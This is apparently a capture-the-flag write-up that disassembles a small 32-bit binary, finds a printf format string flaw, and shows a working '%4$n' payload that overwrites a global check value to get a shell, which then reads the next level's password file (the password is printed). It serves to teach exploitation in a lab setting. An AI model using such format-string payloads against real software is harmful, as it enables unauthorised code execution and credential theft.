# Vulnerable Code Analysis

Start by inspecting the key functions in the program using GDB:

```bash
(gdb) info functions
[...]
0x080484a4  v
0x0804851a  main
[...]
(gdb) disassemble main
Dump of assembler code for function main:
0x0804851a <+0>:     push   %ebp
0x0804851b <+1>:     mov    %esp,%ebp
0x0804851d <+3>:     and    $0xfffffff0,%esp
0x08048520 <+6>:     call   0x80484a4 <v>
0x08048525 <+11>:    leave
0x08048526 <+12>:    ret
End of assembler dump.
(gdb) disassemble v
Dump of assembler code for function v:
0x080484a4 <+0>:     push   %ebp
0x080484a5 <+1>:     mov    %esp,%ebp
0x080484a7 <+3>:     sub    $0x218,%esp
0x080484ad <+9>:     mov    0x8049860,%eax
0x080484b2 <+14>:    mov    %eax,0x8(%esp)
0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
0x080484be <+26>:    lea    -0x208(%ebp),%eax
0x080484c4 <+32>:    mov    %eax,(%esp)
0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
0x080484cc <+40>:    lea    -0x208(%ebp),%eax
0x080484d2 <+46>:    mov    %eax,(%esp)
0x080484d5 <+49>:    call   0x8048390 <printf@plt>
0x080484da <+54>:    mov    0x804988c,%eax
0x080484df <+59>:    cmp    $0x40,%eax
0x080484e2 <+62>:    jne    0x8048518 <v+116>
0x080484e4 <+64>:    mov    0x8049880,%eax
0x080484e9 <+69>:    mov    %eax,%edx
0x080484eb <+71>:    mov    $0x8048600,%eax
0x080484f0 <+76>:    mov    %edx,0xc(%esp)
0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
0x080484fc <+88>:    movl   $0x1,0x4(%esp)
0x08048504 <+96>:    mov    %eax,(%esp)
0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
0x0804850c <+104>:   movl   $0x804860d,(%esp)
0x08048513 <+111>:   call   0x80483c0 <system@plt>
0x08048518 <+116>:   leave
0x08048519 <+117>:   ret
End of assembler dump.
(gdb)
```

## Key Observations
- `main` calls `v`.
- `v` checks a variable against the value `64`.
- Potential vulnerability in `v` due to `printf` using a buffer as a format string.

# Clue for Exploration

Consider these points to guide your exploration:

- **Understanding `printf`**: How does `printf` handle user-supplied data, especially with format specifiers?
- **Input-Output Dynamics**: Experiment with different inputs and observe the changes in output to understand how the program processes data.

# Crafting the Exploit

Our aim is to manipulate a variable in `v` using the format string vulnerability in `printf`.

## Determining Stack Position

We need to locate our input string on the stack. By sending a string with format specifiers to `printf`, we can read values from the stack:

```bash
$ python -c 'print("AAAA" + "%x %x %x %x")' | ./level3
AAAA200 b7fd1ac0 b7ff37d0 41414141
```

In this output, `41414141` (hexadecimal representation of "AAAA") appears at the fourth position, indicating our input string's location on the stack.

## Executing the Exploit

Construct and execute the exploit to alter the targeted memory address:

```bash
$ (python -c 'print("\x8c\x98\x04\x08" + "0"*(64-4) + "%4$n")' && cat) | ./level3
�000000000000000000000000000000000000000000000000000000000000
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

This payload comprises:
- `\x8c\x98\x04\x08`: The memory address we want to modify.
- `"0"*(64-4)`: Fills the buffer to reach 64 bytes, accounting for the 4 bytes already occupied by the memory address.
- `%4$n`: Modifies the value at the fourth position on the stack (our target address) to 64, the total number of bytes written so far.

Executing this payload successfully manipulates the conditional check in `v`, exploiting the format string vulnerability.
